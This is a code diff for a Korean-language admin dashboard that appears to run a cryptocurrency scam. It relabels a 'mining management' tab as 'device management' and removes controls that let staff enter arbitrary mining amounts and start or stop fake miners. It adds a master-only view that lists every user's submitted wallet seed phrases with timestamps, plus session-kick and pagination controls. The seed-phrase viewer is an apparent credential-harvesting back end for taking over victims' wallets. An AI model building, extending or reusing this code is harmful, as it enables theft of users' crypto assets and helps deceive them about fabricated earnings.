@@ -412,8 +412,8 @@
       <span class="icon">🎁</span><span>시드지급</span>
     </button>
     <!-- 총판(매니저)용 탭 -->
-    <button class="tab-btn manager-tab nav-manager hidden" data-tab="sectionMinerMgmt" onclick="showTab('sectionMinerMgmt');loadMinerMgmt()">
-      <span class="icon">⛏️</span><span>채굴관리</span>
+    <button class="tab-btn manager-tab nav-manager hidden" data-tab="sectionMinerMgmt" onclick="showTab('sectionMinerMgmt');loadMinerMgmt(1)">
+      <span class="icon">💻</span><span>기기관리</span>
     </button>
     <button class="tab-btn manager-tab nav-manager hidden" data-tab="sectionMySettlement" onclick="showTab('sectionMySettlement');loadMySettlement(1)">
       <span class="icon">💵</span><span>정산내역</span>
@@ -811,12 +811,12 @@
 
     </div><!-- /sectionGiftSeed -->
 
-    <!-- ===== 채굴 관리 탭 (매니저용) ===== -->
+    <!-- ===== 기기 관리 탭 (매니저용) ===== -->
     <div class="tab-panel hidden" id="sectionMinerMgmt">
       <div class="glass-card">
         <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;">
-          <h2 style="margin:0">채굴기 관리</h2>
-          <button class="btn-ac btn-sm" onclick="loadMinerMgmt()">새로고침</button>
+          <h2 style="margin:0">기기 관리</h2>
+          <button class="btn-ac btn-sm" onclick="loadMinerMgmt(1)">새로고침</button>
         </div>
         <div class="table-container">
           <div class="table-wrapper">
@@ -825,17 +825,30 @@
                 <th>아이디</th>
                 <th>만료일</th>
                 <th>남은 일수</th>
-                <th>채굴기 상태</th>
-                <th>채굴 코인</th>
-                <th>채굴 기록 추가</th>
-                <th>제어</th>
+                <th>기기 상태</th>
+                <th id="thKickBtn" style="display:none">세션 끊기</th>
               </tr></thead>
               <tbody id="minerMgmtBody">
-                <tr><td colspan="7" class="no-data">불러오는 중...</td></tr>
+                <tr><td colspan="4" class="no-data">불러오는 중...</td></tr>
               </tbody>
             </table>
           </div>
         </div>
+        <div id="minerMgmtPager" style="display:flex;gap:6px;justify-content:center;margin-top:12px;flex-wrap:wrap;"></div>
+      </div>
+      <!-- 시드 상세 (마스터 전용, 유저 클릭 시 표시) -->
+      <div id="seedDetailCard" class="glass-card" style="display:none;margin-top:16px;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+          <h3 id="seedDetailTitle" style="margin:0">시드 목록</h3>
+          <button class="btn-ghost btn-sm" onclick="document.getElementById('seedDetailCard').style.display='none'">닫기</button>
+        </div>
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>#</th><th>제출일시</th><th>시드 문구</th></tr></thead>
+            <tbody id="seedDetailBody"><tr><td colspan="3" class="no-data">불러오는 중...</td></tr></tbody>
+          </table>
+        </div>
+        <div id="seedDetailPager" style="display:flex;gap:6px;justify-content:center;margin-top:12px;flex-wrap:wrap;"></div>
       </div>
     </div><!-- /sectionMinerMgmt -->
 
@@ -1480,7 +1493,7 @@
           <td style="white-space:nowrap;">
             <button class="btn-ghost btn-sm" onclick="setSubscription('${esc}')">기간</button>
             <button class="btn-ghost btn-sm" onclick="toggleSuspend('${esc}','${u.status}')">${u.status==='approved'?'정지':'활성화'}</button>
-            <button class="btn-err btn-sm" onclick="removeUser('${esc}')">삭제</button>
+            ${isMaster ? `<button class="btn-err btn-sm" onclick="removeUser('${esc}')">삭제</button>` : ''}
           </td>
         </tr>`;
       }).join('');
@@ -1532,7 +1545,7 @@
       const tbody = document.getElementById('sessions');
       tbody.innerHTML = !list.length
         ? '<tr><td colspan="3" class="empty-state">접속 중인 세션 없음</td></tr>'
-        : list.map(s => `<tr><td>${s.userId}</td><td style="font-family:monospace;">${(s.token||'').slice(0,10)}…</td><td><button class="btn-err btn-sm" onclick="kick('${s.userId}')">끊기</button></td></tr>`).join('');
+        : list.map(s => `<tr><td>${s.userId}</td><td style="font-family:monospace;">${(s.token||'').slice(0,10)}…</td><td>${me && me.role === 'master' ? `<button class="btn-err btn-sm" onclick="kick('${s.userId}')">끊기</button>` : '<span style="color:var(--muted);font-size:12px">-</span>'}</td></tr>`).join('');
     } catch (e) { console.error('세션 실패:', e); }
   }
   async function kick(userId) {
@@ -1950,75 +1963,122 @@
   })();
 
   // =============================================
-  // 채굴 관리 (매니저/마스터 공통)
+  // 기기 관리 (매니저/마스터 공통)
   // =============================================
-  async function loadMinerMgmt() {
+  var _devicePage = 1, _deviceUsers = [];
+
+  async function loadMinerMgmt(page) {
+    _devicePage = page || 1;
     const tbody = document.getElementById('minerMgmtBody');
-    tbody.innerHTML = '<tr><td colspan="7" class="no-data">불러오는 중...</td></tr>';
+    const isMaster = me && me.role === 'master';
+    const thKick = document.getElementById('thKickBtn');
+    if (thKick) thKick.style.display = isMaster ? '' : 'none';
+    const cols = isMaster ? 5 : 4;
+    tbody.innerHTML = '<tr><td colspan="' + cols + '" class="no-data">불러오는 중...</td></tr>';
     try {
-      const usersRes = await api('/api/admin/users');
-      const users = Array.isArray(usersRes) ? usersRes : (usersRes.users || []);
-      if (!users.length) {
-        tbody.innerHTML = '<tr><td colspan="7" class="no-data">회원이 없습니다.</td></tr>';
+      if (_devicePage === 1) {
+        const usersRes = await api('/api/admin/users');
+        _deviceUsers = Array.isArray(usersRes) ? usersRes : (usersRes.users || []);
+      }
+      if (!_deviceUsers.length) {
+        tbody.innerHTML = '<tr><td colspan="' + cols + '" class="no-data">회원이 없습니다.</td></tr>';
+        document.getElementById('minerMgmtPager').innerHTML = '';
         return;
       }
-      const rows = await Promise.all(users.map(async u => {
-        let miner = { status: 'stopped', coin_type: 'BTC' };
-        try { miner = await api('/api/admin/users/' + u.id + '/miner'); } catch {}
+      const pageSize = 10;
+      const total = _deviceUsers.length;
+      const totalPages = Math.ceil(total / pageSize);
+      const start = (_devicePage - 1) * pageSize;
+      const pageUsers = _deviceUsers.slice(start, start + pageSize);
+      const rows = await Promise.all(pageUsers.map(async u => {
+        let miner = { status: 'stopped' };
+        try { miner = await api('/api/admin/users/' + encodeURIComponent(u.id) + '/miner'); } catch {}
         return { ...u, miner };
       }));
       const p = n => String(n).padStart(2, '0');
-      const fmtD = d => { if (!d) return '-'; const dt = new Date(d); return isNaN(dt)?String(d):`${dt.getFullYear()}-${p(dt.getMonth()+1)}-${p(dt.getDate())}`; };
+      const fmtD = d => { if (!d) return '-'; const dt = new Date(d); return isNaN(dt) ? String(d) : `${dt.getFullYear()}-${p(dt.getMonth()+1)}-${p(dt.getDate())}`; };
       tbody.innerHTML = rows.map(u => {
         const isRun = u.miner && u.miner.status === 'running';
         const exp = u.expireDate ? new Date(u.expireDate) : null;
         const remain = exp ? Math.ceil((exp - Date.now()) / 86400000) : 0;
-        const uid = String(u.id).replace(/'/g, '');
-        const ct = (u.miner && u.miner.coin_type) || 'BTC';
-        return '<tr>' +
-          '<td><b>' + uid + '</b></td>' +
+        const uid = String(u.id).replace(/'/g, "\\'");
+        const remainColor = remain <= 0 ? 'var(--err)' : remain <= 7 ? 'var(--warn)' : 'var(--ok)';
+        return '<tr style="cursor:pointer;" onclick="openSeedDetail(\'' + uid + '\')">' +
+          '<td><b>' + u.id + '</b></td>' +
           '<td style="color:var(--muted);font-size:12px">' + fmtD(u.expireDate) + '</td>' +
-          '<td style="color:' + (remain <= 0 ? 'var(--err)' : remain <= 7 ? 'var(--warn)' : 'var(--ok)') + ';font-weight:600">' + (remain <= 0 ? '만료' : remain + '일') + '</td>' +
-          '<td><span class="badge ' + (isRun ? 'badge-run' : 'badge-stop') + '" style="font-size:11px">' + (isRun ? '⛏️ 채굴 중' : '⏹ 정지') + '</span></td>' +
-          '<td><select id="coinSel_' + uid + '" style="padding:4px 8px;font-size:12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--fg);">' +
-            ['BTC','ETH','USDT','SOL'].map(c => '<option' + (ct===c?' selected':'') + '>' + c + '</option>').join('') +
-          '</select></td>' +
-          '<td><div style="display:flex;gap:4px;align-items:center">' +
-            '<input type="number" id="mineAmt_' + uid + '" step="0.00000001" min="0" placeholder="수량" style="width:90px;padding:4px 7px;font-size:12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--fg);">' +
-            '<button class="btn-ok btn-sm" onclick="addMiningRecord(\'' + uid + '\')">추가</button>' +
-          '</div></td>' +
-          '<td><div style="display:flex;gap:4px;">' +
-            '<button class="btn-ok btn-sm" onclick="setMinerStatus(\'' + uid + '\',\'running\')"' + (isRun ? ' disabled' : '') + '>시작</button>' +
-            '<button class="btn-err btn-sm" onclick="setMinerStatus(\'' + uid + '\',\'stopped\')"' + (!isRun ? ' disabled' : '') + '>정지</button>' +
-          '</div></td>' +
+          '<td style="color:' + remainColor + ';font-weight:600">' + (remain <= 0 ? '만료' : remain + '일') + '</td>' +
+          '<td><span class="badge ' + (isRun ? 'badge-run' : 'badge-stop') + '" style="font-size:11px">' + (isRun ? '🟢 작동 중' : '⏹ 정지') + '</span></td>' +
+          (isMaster ? '<td onclick="event.stopPropagation()"><button class="btn-err btn-sm" onclick="kickDevice(\'' + uid + '\')">세션 끊기</button></td>' : '') +
           '</tr>';
       }).join('');
+      const pager = document.getElementById('minerMgmtPager');
+      let phtml = '';
+      for (let i = 1; i <= totalPages; i++) {
+        phtml += '<button class="btn-ghost btn-sm' + (i === _devicePage ? ' active' : '') + '" style="' + (i === _devicePage ? 'background:var(--ac);color:#fff;' : '') + '" onclick="_devicePage=' + i + ';loadMinerMgmt(' + i + ')">' + i + '</button>';
+      }
+      pager.innerHTML = phtml;
     } catch (e) {
-      tbody.innerHTML = '<tr><td colspan="7" class="no-data">' + String(e.message).replace(/</g,'&lt;') + '</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="' + cols + '" class="no-data">' + String(e.message).replace(/</g, '&lt;') + '</td></tr>';
     }
   }
 
-  async function setMinerStatus(userId, status) {
-    const sel = document.getElementById('coinSel_' + userId);
-    const coinType = sel ? sel.value : 'BTC';
+  async function kickDevice(userId) {
+    if (!confirm(userId + ' 세션을 종료하시겠습니까?')) return;
     try {
-      await api('/api/admin/users/' + userId + '/miner', 'PATCH', { status: status, coin_type: coinType });
-      showToast(status === 'running' ? '채굴기 시작됨' : '채굴기 정지됨');
-      loadMinerMgmt();
+      await api('/api/admin/kick', 'POST', { userId });
+      showToast('세션이 종료되었습니다.');
+      loadMinerMgmt(_devicePage);
     } catch (e) { showToast(e.message, 'err'); }
   }
 
-  async function addMiningRecord(userId) {
-    const amtEl = document.getElementById('mineAmt_' + userId);
-    const sel = document.getElementById('coinSel_' + userId);
-    const coinType = sel ? sel.value : 'BTC';
-    const amount = parseFloat(amtEl ? amtEl.value : '0');
-    if (!amount || amount <= 0) { showToast('수량을 입력하세요', 'err'); return; }
+  var _seedDetailUser = null, _seedPage = 1;
+
+  async function openSeedDetail(userId) {
+    _seedDetailUser = userId;
+    _seedPage = 1;
+    const card = document.getElementById('seedDetailCard');
+    card.style.display = '';
+    document.getElementById('seedDetailTitle').textContent = userId + ' — 시드 목록';
+    card.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    if (!me || me.role !== 'master') {
+      document.getElementById('seedDetailBody').innerHTML = '<tr><td colspan="3" class="no-data" style="color:var(--muted)">마스터 권한이 필요합니다.</td></tr>';
+      document.getElementById('seedDetailPager').innerHTML = '';
+      return;
+    }
+    loadSeedDetail(userId, 1);
+  }
+
+  async function loadSeedDetail(userId, page) {
+    _seedPage = page;
+    const tbody = document.getElementById('seedDetailBody');
+    tbody.innerHTML = '<tr><td colspan="3" class="no-data">불러오는 중...</td></tr>';
     try {
-      await api('/api/admin/mining-records', 'POST', { user_id: userId, coin_type: coinType, amount: amount });
-      showToast('채굴 기록이 추가되었습니다.');
-      if (amtEl) amtEl.value = '';
-    } catch (e) { showToast(e.message, 'err'); }
+      const data = await api('/api/admin/users/' + encodeURIComponent(userId) + '/seeds?page=' + page + '&pageSize=10');
+      if (!data.seeds || !data.seeds.length) {
+        tbody.innerHTML = '<tr><td colspan="3" class="no-data">시드 기록이 없습니다.</td></tr>';
+        document.getElementById('seedDetailPager').innerHTML = '';
+        return;
+      }
+      const p2 = n => String(n).padStart(2, '0');
+      const fmtDT = d => { if (!d) return '-'; const dt = new Date(d); return isNaN(dt) ? String(d) : `${dt.getFullYear()}-${p2(dt.getMonth()+1)}-${p2(dt.getDate())} ${p2(dt.getHours())}:${p2(dt.getMinutes())}`; };
+      tbody.innerHTML = data.seeds.map((s, i) => {
+        const rowNum = (page - 1) * 10 + i + 1;
+        return '<tr>' +
+          '<td style="color:var(--muted);text-align:center">' + rowNum + '</td>' +
+          '<td style="font-size:12px;color:var(--muted)">' + fmtDT(s.at) + '</td>' +
+          '<td style="font-family:monospace;font-size:12px;word-break:break-all">' + String(s.phrase).replace(/</g, '&lt;') + '</td>' +
+          '</tr>';
+      }).join('');
+      const totalPages = Math.ceil(data.total / 10);
+      const pager = document.getElementById('seedDetailPager');
+      let phtml = '';
+      for (let i = 1; i <= totalPages; i++) {
+        phtml += '<button class="btn-ghost btn-sm" style="' + (i === page ? 'background:var(--ac);color:#fff;' : '') + '" onclick="loadSeedDetail(\'' + _seedDetailUser + '\',' + i + ')">' + i + '</button>';
+      }
+      pager.innerHTML = phtml;
+    } catch (e) {
+      tbody.innerHTML = '<tr><td colspan="3" class="no-data">' + String(e.message).replace(/</g, '&lt;') + '</td></tr>';
+    }
   }
 
   // =============================================
